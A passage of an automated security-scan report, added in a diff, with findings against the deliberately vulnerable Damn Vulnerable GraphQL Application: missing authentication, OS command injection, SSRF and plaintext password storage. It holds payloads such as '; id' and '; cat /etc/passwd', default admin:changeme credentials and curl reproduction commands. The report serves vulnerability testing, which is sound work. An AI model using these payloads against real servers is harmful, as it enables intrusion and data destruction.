+      "severity": "critical",
+      "tags": [],
+      "title": "Missing Authentication for UploadPaste Mutation",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The ImportPaste GraphQL mutation allows unauthenticated SSRF and command injection attacks by fetching arbitrary URLs via curl with insufficient input sanitization.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "cwe-306-import-paste-mutation-unauthenticated-ssrf",
+      "id": "import-paste-missing-auth",
+      "location": {
+        "code_snippet": null,
+        "end_column": null,
+        "end_line": 223,
+        "file_path": "core/views.py",
+        "function_name": "ImportPaste.mutate",
+        "start_column": null,
+        "start_line": 209
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "ImportPaste.mutate() accepts user-controlled host, port, path, scheme parameters",
+            "file": "core/views.py",
+            "line": 209,
+            "tainted": true
+          },
+          {
+            "description": "Parameters concatenated into URL without proper validation",
+            "file": "core/views.py",
+            "line": 210,
+            "tainted": true
+          },
+          {
+            "description": "strip_dangerous_characters() only removes ; and & in hard mode, does nothing in easy mode",
+            "file": "core/security.py",
+            "line": 41,
+            "tainted": true
+          },
+          {
+            "description": "os.popen(cmd) executes shell command without validation",
+            "file": "core/helpers.py",
+            "line": 9,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": "Server makes connection to arbitrary URL/host specified by attacker, enabling SSRF or command injection",
+        "exploit_hypothesis": "An unauthenticated attacker can invoke the import_paste mutation with host set to an internal service (e.g., 127.0.0.1) or inject shell commands via path parameters to achieve SSRF or command injection.",
+        "exploit_payload": "mutation { importPaste(host: \"127.0.0.1\", port: 6379, path: \"/\", scheme: \"redis://\") { result } }",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": "In easy mode (default): no sanitization. In hard mode: bypass using |, $(), backticks, or other shell metacharacters not stripped.",
+          "bypass_possible": true,
+          "sanitization_found": true,
+          "sanitization_sufficient": false,
+          "sanitization_type": "character removal (strip_dangerous_characters)"
+        },
+        "verification_method": "Traced the ImportPaste.mutate() method in core/views.py:209 which accepts host, port, path, and scheme as arguments. Verified no authentication check exists in the mutate method or in core/middleware.py. Confirmed strip_dangerous_characters() only removes ';' and '&' in hard mode and does nothing in easy mode (default). Confirmed os.popen() in helpers.run_cmd() executes arbitrary commands.",
+        "vulnerable_code": "def mutate(self, info, host='pastebin.com', port=443, path='/', scheme=\"http\"):\n    url = security.strip_dangerous_characters(f\"{scheme}://{host}:{port}{path}\")\n    cmd = helpers.run_cmd(f'curl --insecure {url}')"
+      },
+      "rationale": "The ImportPaste mutation at core/views.py:209 lacks any authentication check. User-controlled host, port, path, and scheme parameters are directly concatenated into a URL and executed via os.popen() through helpers.run_cmd(). In easy mode (default), strip_dangerous_characters() performs no sanitization. In hard mode, only ';' and '&' are stripped, which can be bypassed using |, $(), or backticks. Any unauthenticated user can invoke this mutation to perform SSRF or command injection.",
+      "related_locations": [],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5013/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"mutation { importPaste(host: \\\"127.0.0.1\\\", port: 6379, path: \\\"/\\\", scheme: \\\"redis://\\\") { result } }\"}'",
+          "description": "Send GraphQL mutation to import_paste with arbitrary host parameter",
+          "expected_output": "Server attempts connection to redis://127.0.0.1:6379/",
+          "step": 1
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication-critical-function",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "Missing Authentication for ImportPaste Mutation",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The system_diagnostics GraphQL query allows unauthenticated command execution with arbitrary commands.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "api-missing-auth-system-diagnostics-337",
+      "id": "api-missing-auth-system-diagnostics",
+      "location": {
+        "code_snippet": "def resolve_system_diagnostics(self, info, username, password, cmd='whoami'):\n    q = User.query.filter_by(username='admin').first()\n    real_passw = q.password\n    res, msg = security.check_creds(username, password, real_passw)\n    Audit.create_audit_entry(info)\n    if res:\n      output = f'{cmd}: command not found'\n      if security.allowed_cmds(cmd):\n        output = helpers.run_cmd(cmd)\n      return output\n    return msg",
+        "end_column": null,
+        "end_line": 347,
+        "file_path": "core/views.py",
+        "function_name": "resolve_system_diagnostics",
+        "start_column": null,
+        "start_line": 337
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "GraphQL schema defines system_diagnostics query with username, password, cmd parameters",
+            "file": "core/views.py",
+            "line": 273,
+            "tainted": true
+          },
+          {
+            "description": "resolve_system_diagnostics accepts cmd parameter with default 'whoami'",
+            "file": "core/views.py",
+            "line": 337,
+            "tainted": true
+          },
+          {
+            "description": "security.check_creds validates username='admin' and password='changeme' (default admin password from setup.py)",
+            "file": "core/views.py",
+            "line": 340,
+            "tainted": false
+          },
+          {
+            "description": "allowed_cmds returns True for all commands in easy mode (default)",
+            "file": "core/security.py",
+            "line": 34,
+            "tainted": false
+          },
+          {
+            "description": "run_cmd uses os.popen(cmd).read() to execute command without sanitization",
+            "file": "core/helpers.py",
+            "line": 9,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": null,
+        "exploit_hypothesis": "An attacker can execute arbitrary commands by calling system_diagnostics with default admin credentials (username='admin', password='changeme') and any cmd value. In easy mode (default), security.allowed_cmds() returns True for all commands, allowing unrestricted command execution via os.popen().",
+        "exploit_payload": "{systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"id\")}",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": "In easy mode (default), security.allowed_cmds() returns True for all commands, bypassing any command restrictions. Additionally, no input validation is performed on the cmd parameter before passing to os.popen().",
+          "bypass_possible": true,
+          "sanitization_found": false,
+          "sanitization_sufficient": false,
+          "sanitization_type": null
+        },
+        "verification_method": "Code analysis traced: (1) GraphQL query accepts username/password/cmd parameters, (2) security.check_creds validates against admin user with known password 'changeme', (3) security.allowed_cmds returns True for all commands in easy mode, (4) helpers.run_cmd executes cmd via os.popen(). Reproduction: Send GraphQL query with {systemDiagnostics(username:\"admin\", password:\"changeme\", cmd:\"id\")}",
+        "vulnerable_code": "def run_cmd(cmd):\n  return os.popen(cmd).read()"
+      },
+      "rationale": "The system_diagnostics query requires username/password authentication but uses default credentials (admin:changeme). In easy mode (default), all commands are allowed. The command parameter is passed directly to os.popen() enabling arbitrary command execution.",
+      "related_locations": [
+        {
+          "code_snippet": "def allowed_cmds(cmd):\n  if helpers.is_level_easy():\n    return True\n  elif helpers.is_level_hard():\n    if cmd.startswith(('echo', 'ps' 'whoami', 'tail')):\n      return True\n  return False",
+          "end_column": null,
+          "end_line": 39,
+          "file_path": "core/security.py",
+          "function_name": "allowed_cmds",
+          "start_column": null,
+          "start_line": 33
+        },
+        {
+          "code_snippet": "def run_cmd(cmd):\n  return os.popen(cmd).read()",
+          "end_column": null,
+          "end_line": 9,
+          "file_path": "core/helpers.py",
+          "function_name": "run_cmd",
+          "start_column": null,
+          "start_line": 8
+        },
+        {
+          "code_snippet": "def random_password():\n  weak_passwords = ['changeme']\n  return random.choice(weak_passwords)",
+          "end_column": null,
+          "end_line": 50,
+          "file_path": "setup.py",
+          "function_name": "random_password",
+          "start_column": null,
+          "start_line": 48
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "python3 app.py",
+          "description": "Start the DVGA application (default easy mode)",
+          "expected_output": "Application running on port 5000",
+          "step": 1
+        },
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"{systemDiagnostics(username:\\\"admin\\\", password:\\\"changeme\\\", cmd:\\\"id\\\")}\"}'",
+          "description": "Send GraphQL query with default admin credentials to execute command",
+          "expected_output": "JSON response containing command output (e.g., uid=... gid=...)",
+          "step": 2
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication-for-critical-function",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "Missing Authentication for system_diagnostics Query",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The system_debug GraphQL query allows unauthenticated command execution via ps command injection.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "system_debug_missing_auth_command_injection",
+      "id": "6d877d7f-2678-4b3c-8998-6068dac2ff12",
+      "location": {
+        "code_snippet": "def resolve_system_debug(self, info, arg=None):\n    Audit.create_audit_entry(info)\n    if arg:\n      output = helpers.run_cmd('ps {}'.format(arg))\n    else:\n      output = helpers.run_cmd('ps')\n    return output",
+        "end_column": null,
+        "end_line": 355,
+        "file_path": "core/views.py",
+        "function_name": "resolve_system_debug",
+        "start_column": null,
+        "start_line": 349
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": null,
+        "evidence_level": 6,
+        "expected_outcome": "Command output from executed arbitrary command",
+        "exploit_hypothesis": "An unauthenticated attacker can send a GraphQL query to the system_debug endpoint with a malicious arg parameter containing shell metacharacters (e.g., '; cat /etc/passwd') to execute arbitrary commands on the server.",
+        "exploit_payload": "; id",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": null,
+          "bypass_possible": false,
+          "sanitization_found": false,
+          "sanitization_sufficient": false,
+          "sanitization_type": null
+        },
+        "verification_method": "Code analysis of the resolve_system_debug function, helpers.run_cmd function, and GraphQL schema to confirm lack of authentication and command injection vulnerability.",
+        "vulnerable_code": "def resolve_system_debug(self, info, arg=None):\n    Audit.create_audit_entry(info)\n    if arg:\n      output = helpers.run_cmd('ps {}'.format(arg))\n    else:\n      output = helpers.run_cmd('ps')\n    return output"
+      },
+      "rationale": "The resolve_system_debug function at core/views.py:349 has no authentication check. The arg parameter is directly interpolated into shell command via string formatting without any sanitization, and the command is executed via os.popen(). No authentication is required to access this GraphQL query.",
+      "related_locations": [],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"{ system_debug(arg: \\\"; id\\\") }\"}'",
+          "description": "Send a GraphQL query to the system_debug endpoint without any authentication",
+          "expected_output": "Command output from executing 'id' command",
+          "step": 1
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication-critical-function",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "Missing Authentication for system_debug Query",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The delete_all_pastes GraphQL query allows unauthenticated mass deletion of all paste data.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "cwe-306-missing-auth-delete-all-pastes",
+      "id": "sec-af/api/missing-auth-delete-all-pastes",
+      "location": {
+        "code_snippet": null,
+        "end_column": null,
+        "end_line": 389,
+        "file_path": "core/views.py",
+        "function_name": "resolve_delete_all_pastes",
+        "start_column": null,
+        "start_line": 385
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": null,
+        "evidence_level": 6,
+        "expected_outcome": "All paste records in the database are deleted. The query returns true if deletion was successful.",
+        "exploit_hypothesis": "An unauthenticated attacker can send a GraphQL query requesting delete_all_pastes field, which will execute resolve_delete_all_pastes without any authentication check, causing mass deletion of all paste data in the database.",
+        "exploit_payload": "{ delete_all_pastes }",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": null,
+        "verification_method": "Static code analysis of core/views.py:385 showing resolve_delete_all_pastes function lacks any authentication check. GraphQL schema inspection confirms delete_all_pastes is exposed as a Query field (line 280) with no arguments or authentication decorators. Comparison with resolve_me (line 283) shows the pattern for authenticated queries (takes token parameter), which is absent here.",
+        "vulnerable_code": "def resolve_delete_all_pastes(self, info):\n    Audit.create_audit_entry(info)\n    Paste.query.delete()\n    db.session.commit()\n    return Paste.query.count() == 0"
+      },
+      "rationale": "The resolve_delete_all_pastes function at core/views.py:385 has NO authentication or authorization checks. It is exposed as a GraphQL query field (line 280) that can be invoked by ANY unauthenticated user. The function executes Paste.query.delete() and db.session.commit() without verifying caller identity or permissions. No token parameter is required, no role check is performed, and no middleware enforces authentication. The attack requires only a simple GraphQL query: { delete_all_pastes }.",
+      "related_locations": [
+        {
+          "code_snippet": "delete_all_pastes = graphene.Boolean()",
+          "end_column": null,
+          "end_line": 280,
+          "file_path": "core/views.py",
+          "function_name": "Query.delete_all_pastes",
+          "start_column": null,
+          "start_line": 280
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H 'Content-Type: application/json' -d '{\"query\": \"{ delete_all_pastes }\"}'",
+          "description": "Send a GraphQL POST request to /graphql endpoint with query: { delete_all_pastes }",
+          "expected_output": "Returns {\"data\": {\"delete_all_pastes\": true}} after deleting all pastes",
+          "step": 1
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "Missing Authentication for delete_all_pastes Query",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 3",
+          "control_name": "Protect stored account data",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A02:2021",
+          "control_name": "Cryptographic Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(2)(iv)",
+          "control_name": "Encryption and decryption",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.8.24",
+          "control_name": "Use of cryptography",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-312",
+      "cwe_name": "Cleartext Storage of Sensitive Data",
+      "description": "The User model stores passwords in plaintext without any hashing. The password field is defined as a plain String column (db.String(60)) and the login mutation directly compares plaintext passwords using filter_by(username=username, password=password). This exposes user credentials in the database and makes them vulnerable to theft.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 4,
+      "finding_type": "sast",
+      "fingerprint": " plaintext_password_storage",
+      "id": "67edb862-56fb-479a-b9d1-8b6183fd0f88",
+      "location": {
+        "code_snippet": "class User(db.Model):\n    __tablename__ = 'users'\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(20),unique=True,nullable=False)\n    email = db.Column(db.String(20),unique=True,nullable=False)\n    password = db.Column(db.String(60),nullable=False)",
+        "end_column": null,
+        "end_line": 14,
+        "file_path": "core/models.py",
+        "function_name": null,
+        "start_column": null,
+        "start_line": 9
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "CreateUser mutation passes password directly to User.create_user()",
+            "file": "core/views.py",
+            "line": 102,
+            "tainted": true
+          },
+          {
+            "description": "User.create_user() stores password as-is in database",
+            "file": "core/models.py",
+            "line": 18,
+            "tainted": true
+          },
+          {
+            "description": "User.password column stores plaintext (db.String(60))",
+            "file": "core/models.py",
+            "line": 14,
+            "tainted": true
+          },
+          {
+            "description": "Login mutation uses filter_by(username=username, password=password) for plaintext comparison",
+            "file": "core/views.py",
+            "line": 234,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": null,
+        "exploit_hypothesis": "Attacker with database access (via breach, SQL injection, or backup theft) can retrieve all user passwords in plaintext. Additionally, the login mutation performs direct plaintext comparison enabling trivial password cracking.",
+        "exploit_payload": null,
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": null,
+          "bypass_possible": false,
+          "sanitization_found": false,
+          "sanitization_sufficient": false,
+          "sanitization_type": null
+        },
+        "verification_method": "Traced password flow from CreateUser mutation input through User.create_user() to database storage, and from Login mutation through filter_by() comparison. No hashing functions found in codebase.",
+        "vulnerable_code": null
+      },
+      "rationale": "Full source-to-sink flow confirmed: Password input flows directly to database storage (core/views.py:102 -> core/models.py:14) without hashing, and login compares plaintext passwords (core/views.py:234). No sanitization or hashing present. Exploitable via database breach or SQL injection.",
+      "related_locations": [
+        {
+          "code_snippet": "def mutate(root, info, user_data=None):\n    user_obj = User.create_user(\n      username=user_data.username,\n      email=user_data.email,\n      password=user_data.password\n    )",
+          "end_column": null,
+          "end_line": 103,
+          "file_path": "core/views.py",
+          "function_name": null,
+          "start_column": null,
+          "start_line": 98
+        },
+        {
+          "code_snippet": "def mutate(self, info , username, password) :\n        user = User.query.filter_by(username=username, password=password).first()\n        Audit.create_audit_entry(info)\n        if not user:\n            raise Exception('Authentication Failure')",
+          "end_column": null,
+          "end_line": 237,
+          "file_path": "core/views.py",
+          "function_name": null,
+          "start_column": null,
+          "start_line": 233
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "mutation { createUser(userData: {username: \"testuser\", email: \"test@test.com\", password: \"MySecretPass123\"}) { user { username } } }",
+          "description": "Create a new user via GraphQL mutation with a test password",
+          "expected_output": "User created successfully",
+          "step": 1
+        },
+        {
+          "command": "SELECT username, password FROM users WHERE username='testuser';",
+          "description": "Query database directly or via SQL injection to retrieve plaintext password",
+          "expected_output": "Returns plaintext password: MySecretPass123",
+          "step": 2
+        },
+        {
+          "command": "mutation { login(username: \"testuser\", password: \"MySecretPass123\") { accessToken } }",
+          "description": "Login with retrieved plaintext password",
+          "expected_output": "Login successful - validates plaintext password comparison",
+          "step": 3
+        }
+      ],
+      "sarif_rule_id": "sec-af/sast/cwe-312-cleartext-storage-of-sensitive-data",
+      "sarif_security_severity": 4,
+      "severity": "high",
+      "tags": [],
+      "title": "Plaintext Password Storage in Database Model",
+      "verdict": "confirmed"
+    }
+  ],
+  "inconclusive": 0,
+  "likely": 0,
+  "noise_reduction_pct": 0,
+  "not_exploitable": 0,
+  "provider": "harness",
+  "repository": "https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application",
+  "sarif": "{\n  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n  \"version\": \"2.1.0\",\n  \"runs\": [\n    {\n      \"tool\": {\n        \"driver\": {\n          \"name\": \"SEC-AF\",\n          \"semanticVersion\": \"0.1.0\",\n          \"informationUri\": \"https://github.com/Agent-Field/sec-af\",\n          \"rules\": [\n            {\n              \"id\": \"sec-af/api/missing-authentication\",\n              \"name\": \"MissingAuthentication\",\n              \"shortDescription\": {\n                \"text\": \"Missing Authentication for delete_all_pastes Query vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The delete_all_pastes GraphQL query allows unauthenticated mass deletion of all paste data.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/306.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-306\",\n                  \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n                  \"compliance:ISO27001:A.5.15\",\n                  \"compliance:OWASP:A07:2021\",\n                  \"compliance:PCI-DSS:Req-8\",\n                  \"compliance:SOC2:CC6\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/api/missing-authentication-critical-function\",\n              \"name\": \"MissingAuthenticationCriticalFunction\",\n              \"shortDescription\": {\n                \"text\": \"Missing Authentication for CreateUser Mutation vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The CreateUser GraphQL mutation allows any unauthenticated user to create new user accounts. No authentication check, JWT verification, or authorization is performed before creating user accounts.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/306.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-306\",\n                  \"OWASP-A7:2017 - Missing Function Level Access Control\",\n                  \"api\",\n                  \"authentication\",\n                  \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n                  \"compliance:ISO27001:A.5.15\",\n                  \"compliance:OWASP:A07:2021\",\n                  \"compliance:PCI-DSS:Req-8\",\n                  \"compliance:SOC2:CC6\",\n                  \"graphql\",\n                  \"missing-auth\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/api/missing-authentication-for-critical-function\",\n              \"name\": \"MissingAuthenticationForCriticalFunction\",\n              \"shortDescription\": {\n                \"text\": \"Missing Authentication for system_diagnostics Query vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The system_diagnostics GraphQL query allows unauthenticated command execution with arbitrary commands.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/306.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-306\",\n                  \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n                  \"compliance:ISO27001:A.5.15\",\n                  \"compliance:OWASP:A07:2021\",\n                  \"compliance:PCI-DSS:Req-8\",\n                  \"compliance:SOC2:CC6\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/config/improper-authentication\",\n              \"name\": \"ImproperAuthentication\",\n              \"shortDescription\": {\n                \"text\": \"JWT Signature and Expiration Verification Disabled vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"JWT token signature and expiration verification is disabled (verify_signature=False, verify_exp=False), allowing attackers to forge tokens, impersonate any user, and use expired tokens indefinitely. This is a critical authentication bypass vulnerability.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/287.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-287\",\n                  \"compliance:HIPAA:\\u00a7164.312(d)\",\n                  \"compliance:ISO27001:A.5.17\",\n                  \"compliance:OWASP:A07:2021\",\n                  \"compliance:PCI-DSS:Req-8\",\n                  \"compliance:SOC2:CC6\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/sast/cwe-312-cleartext-storage-of-sensitive-data\",\n              \"name\": \"Cwe312CleartextStorageOfSensitiveData\",\n              \"shortDescription\": {\n                \"text\": \"Plaintext Password Storage in Database Model vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The User model stores passwords in plaintext without any hashing. The password field is defined as a plain String column (db.String(60)) and the login mutation directly compares plaintext passwords using filter_by(username=username, password=password). This exposes user credentials in the database and makes them vulnerable to theft.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/312.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"4.0\",\n                \"tags\": [\n                  \"CWE-312\",\n                  \"compliance:HIPAA:\\u00a7164.312(a)(2)(iv)\",\n                  \"compliance:ISO27001:A.8.24\",\n                  \"compliance:OWASP:A02:2021\",\n                  \"compliance:PCI-DSS:Req-3\",\n                  \"compliance:SOC2:CC6\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/sast/cwe-78-os-command-injection\",\n              \"name\": \"Cwe78OsCommandInjection\",\n              \"shortDescription\": {\n                \"text\": \"OS Command Injection in ImportPaste mutation vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The import_paste mutation accepts user-controlled host, port, path, and scheme parameters that are directly interpolated into a shell command executed via os.popen. The strip_dangerous_characters function only removes semicolons and ampersands, which is insufficient to prevent command injection.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/78.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-78\",\n                  \"compliance:HIPAA:\\u00a7164.312(c)(1)\",\n                  \"compliance:ISO27001:A.8.28\",\n                  \"compliance:OWASP:A03:2021\",\n                  \"compliance:PCI-DSS:Req-6.2.4\",\n                  \"compliance:SOC2:CC7\",\n                  \"security\"\n                ]\n              }\n            },\n            {\n              \"id\": \"sec-af/sast/os-command-injection\",\n              \"name\": \"OsCommandInjection\",\n              \"shortDescription\": {\n                \"text\": \"OS Command Injection in system_diagnostics query vulnerability\"\n              },\n              \"fullDescription\": {\n                \"text\": \"The system_diagnostics GraphQL query accepts a cmd parameter that is passed to helpers.run_cmd(). While there is an allowed_cmds check in security.py, in 'easy' mode (default), this check returns True for all commands, allowing arbitrary command execution.\"\n              },\n              \"helpUri\": \"https://cwe.mitre.org/data/definitions/78.html\",\n              \"defaultConfiguration\": {\n                \"level\": \"error\"\n              },\n              \"properties\": {\n                \"precision\": \"very-high\",\n                \"security-severity\": \"5.0\",\n                \"tags\": [\n                  \"CWE-78\",\n                  \"OWASP-A1:2017-Injection\",\n                  \"command-injection\",\n                  \"compliance:HIPAA:\\u00a7164.312(c)(1)\",\n                  \"compliance:ISO27001:A.8.28\",\n                  \"compliance:OWASP:A03:2021\",\n                  \"compliance:PCI-DSS:Req-6.2.4\",\n                  \"compliance:SOC2:CC7\",\n                  \"graphql\",\n                  \"os-command\",\n                  \"security\"\n                ]\n              }\n            }\n          ]\n        }\n      },\n      \"results\": [\n        {\n          \"ruleId\": \"sec-af/sast/cwe-78-os-command-injection\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] OS Command Injection in ImportPaste mutation: The import_paste mutation accepts user-controlled host, port, path, and scheme parameters that are directly interpolated into a shell command executed via os.popen. The strip_dangerous_characters function only removes semicolons and ampersands, which is insufficient to prevent command injection.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 209,\n                  